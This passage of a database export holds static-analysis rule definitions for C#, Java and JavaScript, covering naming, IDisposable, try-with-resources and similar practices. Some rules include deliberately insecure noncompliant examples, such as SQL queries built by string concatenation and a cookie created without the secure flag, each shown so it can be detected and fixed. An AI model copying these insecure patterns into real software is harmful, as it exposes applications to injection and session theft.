appropriate permission            \n        // in  place of UnmanagedCode permission as             \n        // ShowCursor is not considered a safe method            \n        new UIPermission(UIPermissionWindow.AllWindows).Demand();\n        UnsafeNativeMethods.ShowCursor(false);\n    }\n}\n\n[SuppressUnmanagedCodeSecurityAttribute]\ninternal static class UnsafeNativeMethods\n{\n    [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]\n    internal static extern int ShowCursor([MarshalAs(UnmanagedType.Bool)]bool bShow);\n}\n</pre>\n\n\n\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182161.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182161.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806836	1511453806837	1
385	CA1707: Identifiers should not contain underscores	IdentifiersShouldNotContainUnderscores	CA1707	fxcop	<h2>Cause</h2>\n<p>\n            The name of an identifier contains the underscore (_) character.\n</p>\n<h2>Rule Description</h2>\n<p>\n            By convention, identifier names do not contain the underscore (_) character. The rule checks namespaces, types, members, and parameters.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Remove all underscore characters from the name.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:IdentifiersShouldBeCasedCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:IdentifiersShouldDifferByMoreThanCase}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182245.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182245.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	5min	\N	\N	\N	\N	\N	f	HTML	1511453806838	1511453806839	1
386	CA1051: Do not declare visible instance fields	DoNotDeclareVisibleInstanceFields	CA1051	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible type has an externally visible instance field.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The primary use of a field should be as an implementation detail. Fields should be <code>private</code> or <code>internal</code> and should be exposed by using properties. It is as easy to access a property as it is to access a field, and the code in the accessors of a property can change as the features of the type expand without introducing breaking changes. Properties that just return the value of a private or internal field are optimized to perform on par with accessing a field; very little performance gain is associated with the use of externally visible fields over properties.\n            Externally visible refers to <code>public</code>, <code>protected</code>, and <code>protected internal</code> (<code>Public</code>, <code>Protected</code>, and <code>Protected Friend</code> in Visual Basic) accessibility levels.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, make the field <code>private</code> or <code>internal</code> and expose it by using an externally visible property.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Externally visible fields do not provide any benefits that are unavailable to properties. Additionally, public fields cannot be protected by Link Demands. See {rule:fxcop:SecuredTypesShouldNotExposeFields}.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:SecuredTypesShouldNotExposeFields}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182141.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182141.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806839	1511453806840	1
387	CA2213: Disposable fields should be disposed	DisposableFieldsShouldBeDisposed	CA2213	fxcop	<h2>Cause</h2>\n<p>\n            A type that implements <code>System.IDisposable</code> declares fields that are of types that also implement <code>IDisposable</code>. The <code>Dispose</code> method of the field is not called by the <code>Dispose</code> method of the declaring type.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A type is responsible for disposing of all its unmanaged resources; this is accomplished by implementing <code>IDisposable</code>. This rule checks to see whether a disposable type T declares a field F that is an instance of a disposable type FT. For each field F, the rule attempts to locate a call to FT.Dispose. The rule searches the methods called by T.Dispose, and one level lower (the methods called by the methods called by FT.Dispose).\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, call <code>Dispose</code> on fields that are of types that implement <code>IDisposable</code> if you are responsible for allocating and releasing the unmanaged resources held by the field.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if you are not responsible for releasing the resource held by the field, or if the call to <code>Dispose</code> occurs at a deeper calling level than the rule checks.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182328.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182328.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806841	1511453806841	1
904	Variables should not be self-assigned	S1656	\N	javascript	<p>There is no reason to re-assign a variable to itself. Either this statement is redundant and should be removed, or the re-assignment is a mistake and some other value or variable was intended for the assignment instead.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction setName(name) {\n    name = name;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfunction setName(name) {\n    this.name = name;\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n<li><a href="https://www.securecoding.cert.org/confluence/x/NYA5">CERT, MSC12-C</a> - Detect and remove code that has no effect</li>\n<li><a href="https://www.securecoding.cert.org/confluence/x/SIIyAQ">CERT, MSC12-CPP</a> - Detect and remove code that has no effect</li>\n</ul>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	3min	\N	\N	cert	f	HTML	1511453807516	1511453807517	2
905	Lines should not be too long	LineLength	\N	javascript	<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807517	1511453807517	1
906	JavaScript parser failure	ParsingError	\N	javascript	<p>When the JavaScript parser fails, it is possible to record the failure as a violation on the file. This way, not only it is possible to track the number of files that do not parse but also to easily find out why they do not parse.</p>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	\N	f	HTML	1511453807519	1511453807519	1
389	CA1063: Implement IDisposable correctly	ImplementIDisposableCorrectly	CA1063	fxcop	<h2>Cause</h2>\n<p>\n\n\n                <code>IDisposable</code>\n               is not implemented correctly. Some reasons for this problem are listed here:\n            <ul>\n              <li>\n                IDisposable is re-implemented in the class.\n              </li>\n              <li>\n                Finalize is re-overridden.\n              </li>\n              <li>\n                Dispose is overridden.\n              </li>\n              <li>\n                Dispose() is not public, sealed, or named Dispose.\n              </li>\n              <li>\n                Dispose(bool) is not protected, virtual, or unsealed.\n              </li>\n              <li>\n                In unsealed types, Dispose() must call Dispose(true).\n              </li>\n              <li>\n                For unsealed types, the Finalize implementation does not call either or both Dispose(bool) or the case class finalizer.\n              </li>\n            </ul>\n            Violation of any one of these patterns will trigger this warning.\n            Every unsealed root IDisposable type must provide its own protected virtual void Dispose(bool) method. Dispose() should call Dipose(true) and Finalize should call Dispose(false). If you are creating an unsealed root IDisposable type, you must define Dispose(bool) and call it. For more information, see <code>Cleaning Up Unmanaged Resources</code> in the Framework Design Guidelines section of the .NET Framework documentation.\n</p>\n<h2>Rule Description</h2>\n<p>\n            All IDisposable types should implement the Dispose pattern correctly.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Examine your code and determine which of the following resolutions will fix this violation.\n            <ul>\n              <li>\n                Remove IDisposable from the list of interfaces that are implemented by {0} and override the base class Dispose implementation instead.\n              </li>\n              <li>\n                Remove the finalizer from type {0}, override Dispose(bool disposing), and put the finalization logic in the code path where 'disposing' is false.\n              </li>\n              <li>\n                Remove {0}, override Dispose(bool disposing), and put the dispose logic in the code path where 'disposing' is true.\n              </li>\n              <li>\n                Ensure that {0} is declared as public and sealed.\n              </li>\n              <li>\n                Rename {0} to 'Dispose' and make sure that it is declared as public and sealed.\n              </li>\n              <li>\n                Make sure that {0} is declared as protected, virtual, and unsealed.\n              </li>\n              <li>\n                Modify {0} so that it calls Dispose(true), then calls GC.SuppressFinalize on the current object instance ('this' or 'Me' in Visual Basic), and then returns.\n              </li>\n              <li>\n                Modify {0} so that it calls Dispose(false) and then returns.\n              </li>\n              <li>\n                If you are writing an unsealed root IDisposable class, make sure that the implementation of IDisposable follows the pattern that is described earlier in this section.\n              </li>\n            </ul>\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms244737.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms244737.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806843	1511453806845	1
390	CA2100: Review SQL queries for security vulnerabilities	ReviewSqlQueriesForSecurityVulnerabilities	CA2100	fxcop	<h2>Cause</h2>\n<p>\n            A method sets the <code>IDbCommand.CommandText</code> property by using a string that is built from a string argument to the method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule assumes that the string argument contains user input. A SQL command string that is built from user input is vulnerable to SQL injection attacks. In a SQL injection attack, a malicious user supplies input that alters the design of a query in an attempt to damage or gain unauthorized access to the underlying database. Typical techniques include injection of a single quotation mark or apostrophe, which is the SQL literal string delimiter; two dashes, which signifies a SQL comment; and a semicolon, which indicates that a new command follows. If user input must be part of the query, use one of the following, listed in order of effectiveness, to reduce the risk of attack.\n            <ul>\n              <li>\n                Use a stored procedure.\n              </li>\n              <li>\n                Use a parameterized command string.\n              </li>\n              <li>\n                Validate the user input for both type and content before you build the command string.\n              </li>\n            </ul>\n            The following .NET Framework types implement the <code>CommandText</code> property or provide constructors that set the property by using a string argument.\n            <ul>\n              <li>\n\n\n                    <code>System.Data.Odbc.OdbcCommand</code>\n                   and <code>System.Data.Odbc.OdbcDataAdapter</code>\n              </li>\n              <li>\n\n\n                    <code>System.Data.OleDb.OleDbCommand</code>\n                   and <code>System.Data.OleDb.OleDbDataAdapter</code>\n              </li>\n              <li>\n\n\n                    <code>System.Data.OracleClient.OracleCommand</code>\n                   and <code>System.Data.OracleClient.OracleDataAdapter</code>\n              </li>\n              <li>\n\n                  [System.Data.SqlServerCe.SqlCeCommand] and  [System.Data.SqlServerCe.SqlCeDataAdapter]\n              </li>\n              <li>\n\n\n                    <code>System.Data.SqlClient.SqlCommand</code>\n                   and <code>System.Data.SqlClient.SqlDataAdapter</code>\n              </li>\n            </ul>\n            Notice that this rule is violated when the ToString method of a type is used explicitly or implicitly to construct the query string. The following is an example.\n\n\n\n\n\n\n\n\n\n            <pre>\nint x = 10;\nstring query = "SELECT TOP " + x.ToString() + " FROM Table";\n</pre>\n\n\n\n\nThe rule is violated because a malicious user can override the ToString() method.The rule also is violated when ToString is used implicitly.\n\n\n\n\n\n\n\n\n\n            <pre>\nint x = 10;\nstring query = String.Format("SELECT TOP {0} FROM Table", x);\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n                How to Fix Violations\n\n\n\n\n\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the command text does not contain any user input.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182310.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182310.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806846	1511453806846	1
391	CA1415: Declare P/Invokes correctly	DeclarePInvokesCorrectly	CA1415	fxcop	<h2>Cause</h2>\n<p>\n            A platform invoke method is incorrectly declared.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A platform invoke method accesses unmanaged code and is defined by using the <code>Declare</code> keyword in Visual Basic or the <code>System.Runtime.InteropServices.DllImportAttribute</code>. Currently, this rule looks for platform invoke method declarations that target Win32 functions that have a pointer to an OVERLAPPED structure parameter and the corresponding managed parameter is not a pointer to a <code>System.Threading.NativeOverlapped</code> structure.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, correctly declare the platform invoke method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182204.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182204.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806847	1511453806848	1
392	CA1823: Avoid unused private fields	AvoidUnusedPrivateFields	CA1823	fxcop	<h2>Cause</h2>\n<p>\n            This rule is reported when a private field in your code exists but is not used by any code path.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Private fields were detected that do not appear to be accessed in the assembly.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the field or add code that uses it.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:AvoidUninstantiatedInternalClasses}<br/>\n\n\n\n\n                {rule:fxcop:ReviewUnusedParameters}<br/>\n\n\n\n\n                {rule:fxcop:RemoveUnusedLocals}<br/>\n\n\n\n\n                {rule:fxcop:AvoidUncalledPrivateCode}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms245042.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms245042.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806850	1511453806850	1
393	CA2222: Do not decrease inherited member visibility	DoNotDecreaseInheritedMemberVisibility	CA2222	fxcop	<h2>Cause</h2>\n<p>\n            A private method in an unsealed type has a signature that is identical to a public method declared in a base type. The private method is not final.\n</p>\n<h2>Rule Description</h2>\n<p>\n            You should not change the access modifier for inherited members. Changing an inherited member to private does not prevent callers from accessing the base class implementation of the method. If the member is made private and the type is unsealed, inheriting types can call the last public implementation of the method in the inheritance hierarchy. If you must change the access modifier, either the method should be marked final or its type should be sealed to prevent the method from being overridden.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the access to be non-private. Alternatively, if your programming language supports it, you can make the method final.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182332.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182332.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806851	1511453806851	1
394	CA1505: Avoid unmaintainable code	AvoidUnmantainableCode	CA1505	fxcop	<h2>Cause</h2>\n<p>\n            A type or method has a low maintainability index value.\n</p>\n<h2>Rule Description</h2>\n<p>\n            The maintainability index is calculated by using the following metrics: lines of code, program volume, and cyclomatic complexity. Program volume is a measure of the difficulty of understanding of a type or method that is based on the number of operators and operands in the code. Cyclomatic complexity is a measure of the structural complexity of the type or method. You can learn more about code metrics at Measuring Complexity and Maintainability of Managed Code.\n            A low maintainability index indicates that a type or method is probably difficult to maintain and would be a good candidate to redesign.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix this violation, redesign the type or method and try to split it into smaller and more focused types or methods.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Exclude this warning when a type or method is still considered maintainable despite its large size or when the type or method cannot be split.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb386043.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb386043.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	30min	\N	\N	\N	\N	\N	f	HTML	1511453806852	1511453806852	1
395	CA1714: Flags enums should have plural names	FlagsEnumsShouldHavePluralNames	CA1714	fxcop	<h2>Cause</h2>\n<p>\n            A public enumeration has the <code>System.FlagsAttribute</code> and its name does not end in 's'.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Types that are marked with <code>FlagsAttribute</code> have names that are plural because the attribute indicates that more than one value can be specified. For example, an enumeration that defines the days of the week might be intended for use in an application where you can specify multiple days. This enumeration should have the <code>FlagsAttribute</code> and could be called 'Days'. A similar enumeration that allows only a single day to be specified would not have the attribute, and could be called 'Day'.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the learning curve that is required for new software libraries, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Make the name of the enumeration a plural word, or remove the <code>FlagsAttribute</code> attribute if multiple enumeration values should not be specified simultaneously.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a violation if the name is a plural word but does not end in 's'. For example, if the multiple-day enumeration that was described previously were named 'DaysOfTheWeek', this would violate the logic of the rule but not its intent. Such violations should be suppressd.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:MarkEnumsWithFlags}<br/>\n\n\n\n\n                {rule:fxcop:DoNotMarkEnumsWithFlags}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/bb264486.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/bb264486.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806853	1511453806854	1
396	CA1035: ICollection implementations have strongly typed members	ICollectionImplementationsHaveStronglyTypedMembers	CA1035	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type implements <code>System.Collections.ICollection</code> but does not provide a strongly typed method for <code>ICollection.CopyTo</code>. The strongly typed version of <code>CopyTo</code> must accept two parameters and cannot have a <code>System.Array</code> or an array of <code>System.Object</code> as its first parameter.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule requires <code>ICollection</code> implementations to provide strongly typed members so that users are not required to cast arguments to the <code>Object</code> type when they use the functionality that is provided by the interface. This rule assumes that the type that implements <code>ICollection</code> does so to manage a collection of instances of a type that is stronger than <code>Object</code>.\n\n\n                <code>ICollection</code>\n               implements the <code>System.Collections.IEnumerable</code> interface. If the objects in the collection extend <code>System.ValueType</code>, you must provide a strongly typed member for <code>GetEnumerator</code> to avoid the decrease in performance that is caused by boxing. This is not required when the objects of the collection are a reference type.\n            To implement a strongly typed version of an interface member, implement the interface members explicitly by using names in the form InterfaceName.InterfaceMemberName, such as <code>CopyTo</code>. The explicit interface members use the data types that are declared by the interface. Implement the strongly typed members by using the interface member name, such as <code>CopyTo</code>. Declare the strongly typed members as public, and declare parameters and return values to be of the strong type that is managed by the collection. The strong types replace weaker types such as <code>Object</code> and <code>Array</code> that are declared by the interface.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement the interface member explicitly (declare it as <code>CopyTo</code>). Add the public strongly typed member, declared as CopyTo, and have it take a strongly typed array as its first parameter.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule if you implement a new object-based collection, such as a binary tree, where types that extend the new collection determine the strong type. These types should comply with this rule and expose strongly typed members.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:EnumeratorsShouldBeStronglyTyped}<br/>\n\n\n\n\n                {rule:fxcop:ListsAreStronglyTyped}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/49stb304.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/49stb304.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806854	1511453806855	1
555	A "for" loop update clause should move the counter in the right direction	S2251	S2251	squid	A <code>for</code> loop with a counter that moves in the wrong direction is not an infinite loop. Because of wraparound, the loop will eventually reach its stop condition, but in doing so, it will run many, many more times than anticipated, potentially causing unexpected behavior. \n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic void doSomething(String [] strings) {\n  for (int i = 0; i &lt; strings.length; i--) { // Noncompliant;\n    String string = strings[i];  // ArrayIndexOutOfBoundsException when i reaches -1\n    //...\n  }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic void doSomething(String [] strings) {\n  for (int i = 0; i &lt; strings.length; i++) {\n    String string = strings[i];\n    //...\n  }\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453807084	1511453807085	2
556	Parsing should be used to convert "Strings" to primitives	S2130	S2130	squid	Rather than creating a boxed primitive from a <code>String</code> to extract the primitive value, use the relevant <code>parse</code> method instead. It will be clearer and more efficient.\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nString myNum = "12.2";\n\nfloat f = new Float(myNum).floatValue();  // Noncompliant; creates &amp; discards a Float\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nString myNum = "12.2";\n\nfloat f = Float.parseFloat(myNum);\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	performance	f	HTML	1511453807085	1511453807086	1
397	CA1009: Declare event handlers correctly	DeclareEventHandlersCorrectly	CA1009	fxcop	<h2>Cause</h2>\n<p>\n            A delegate that handles a public or protected event does not have the correct signature, return type, or parameter names.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Event handler methods take two parameters. The first is of type <code>System.Object</code> and is named 'sender'. This is the object that raised the event. The second parameter is of type <code>System.EventArgs</code> and is named 'e'. This is the data that is associated with the event. For example, if the event is raised whenever a file is opened, the event data typically contains the name of the file.\n            Event handler methods should not return a value. In the C# programming language, this is indicated by the return type <code>void</code>. An event handler can invoke multiple methods in multiple objects. If the methods were allowed to return a value, multiple return values would occur for each event, and only the value of the last method that was invoked would be available.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, correct the signature, return type, or parameter names of the delegate. For details, see the following example.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:ReviewVisibleEventHandlers}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182133.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182133.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806855	1511453806856	1
398	CA1054: URI parameters should not be strings	UriParametersShouldNotBeStrings	CA1054	fxcop	<h2>Cause</h2>\n<p>\n            A type declares a method with a string parameter whose name contains "uri", "Uri", "urn", "Urn", "url", or "Url" and the type does not declare a corresponding overload that takes a <code>System.Uri</code> parameter.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule splits the parameter name into tokens based on the camel casing convention and checks whether each token equals "uri", "Uri", "urn", "Urn", "url", or "Url". If there is a match, the rule assumes that the parameter represents a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. If a method takes a string representation of a URI, a corresponding overload should be provided that takes an instance of the <code>Uri</code> class, which provides these services in a safe and secure manner.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the parameter to a <code>Uri</code> type; this is a breaking change. Alternately, provide an overload of the method which takes a <code>Uri</code> parameter; this is a nonbreaking change.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the parameter does not represent a URI.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:UriPropertiesShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:UriReturnValuesShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:PassSystemUriObjectsInsteadOfStrings}<br/>\n\n\n\n\n                {rule:fxcop:StringUriOverloadsCallSystemUriOverloads}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182174.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182174.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806857	1511453806857	1
557	Annotation arguments should appear in the order in which they were declared	S3340	S3340	squid	<p>For optimal code readability, annotation arguments should be specified in the same order that they were declared in the annotation definition.</p>\n\n<h2>Noncompliant</h2>\n<pre>\n@interface Pet {\nString name();\nString surname();\n}\n\n@Pet(surname ="", name="") // Noncompliant\n</pre>\n\n<h2>Compliant</h2>\n<pre>\n@interface Pet {\nString name();\nString surname();\n}\n\n@Pet(name ="", surname="") // Compliant\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453807086	1511453807087	1
558	Checked Exception should not be thrown	S1162	S1162	squid	<p>The purpose of checked exceptions is to ensure that errors will be dealt with, either by propagating them or by handling them, but some believe that checked exceptions negatively impact the readability of source code, by spreading this error handling/propagation logic everywhere.</p>\n<p>This rule verifies that no method throws a new checked exception.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic void myMethod1() throws CheckedException {\n  ...\n  throw new CheckedException(message);   // Noncompliant\n  ...\n  throw new IllegalArgumentException(message); // Compliant; IllegalArgumentException is unchecked\n}   \n\npublic void myMethod2() throws CheckedException {  // Compliant; propagation allowed\n  myMethod1();\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	error-handling	f	HTML	1511453807087	1511453807088	1
559	"ConcurrentLinkedQueue.size()" should not be used	S2250	S2250	squid	<p>For most collections the <code>size()</code> method requires constant time, but the time required to execute <code>ConcurrentLinkedQueue.size()</code> is directly proportional to the number of elements in the queue. When the queue is large, this could therefore be an expensive operation. Further, the results may be inaccurate if the queue is modified during execution.</p>\n\n<p>By the way, if the <code>size()</code> is used only to check that the collection is empty, then the <code>isEmpty()</code> method should be used.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nConcurrentLinkedQueue queue = new ConcurrentLinkedQueue();\n//...\nlog.info("Queue contains " + queue.size() + " elements");\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	performance	f	HTML	1511453807088	1511453807089	3
399	Try-with-resources should be used	S2093	S2093	squid	<p>Java 7 introduced the try-with-resources statement, which guarantees that the resource in question will be closed. Since the new syntax is closer to bullet-proof, it should be preferred over the older <code>try</code>/<code>catch</code>/<code>finally</code> version.</p>\n<p>This rule checks that <code>close</code>-able resources are opened in a try-with-resources statement.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nFileReader fr = null;\nBufferedReader br = null;\ntry {\n  fr = new FileReader(fileName);\n  br = new BufferedReader(fr);\n  return br.readLine();\n} catch (...) {\n} finally {\n  if (br != null) {\n    try {\n      br.close();\n    } catch(IOException e){...}\n  }\n  if (fr != null ) {\n    try {\n      br.close();\n    } catch(IOException e){...}\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\ntry (\n    FileReader fr = new FileReader(fileName);\n    BufferedReader br = new BufferedReader(fr)\n  ) {\n  return br.readLine();\n}\ncatch (...) {}\n</pre>\n<p>or</p>\n<pre>\ntry (BufferedReader br = \n        new BufferedReader(new FileReader(fileName))) { // no need to name intermediate resources if you don't want to\n  return br.readLine();\n}\ncatch (...) {}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	pitfall	f	HTML	1511453806858	1511453806859	1
400	Cookies should be "secure"	S2092	S2092	squid	<p>The "secure" attribute prevents cookies from being sent over plaintext connections such as HTTP, where they would be easily eavesdropped upon. Instead, cookies with the secure attribute are only sent over encrypted HTTPS connections.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nCookie c = new Cookie(SECRET, secret);  // Noncompliant; cookie is not secure\nresponse.addCookie(c);\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nCookie c = new Cookie(SECRET, secret);\nc.setSecure(true);\nresponse.addCookie(c);\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/614">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\n</li><li> <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management">OWASP Top Ten 2013 Category A2</a> - Broken Authentication and Session Management\n</li><li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe,owasp-a2,owasp-a6	f	HTML	1511453806863	1511453806864	3
